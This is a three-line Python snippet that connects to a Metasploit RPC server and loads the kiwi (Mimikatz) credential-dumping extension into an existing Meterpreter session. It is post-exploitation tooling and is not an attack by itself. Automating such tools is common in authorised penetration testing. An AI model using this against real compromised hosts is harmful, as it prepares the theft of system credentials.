from pymetasploit3.msfrpc import MsfRpcClient

client = MsfRpcClient('test', port=55553)
client.sessions.session(1).write("load kiwi")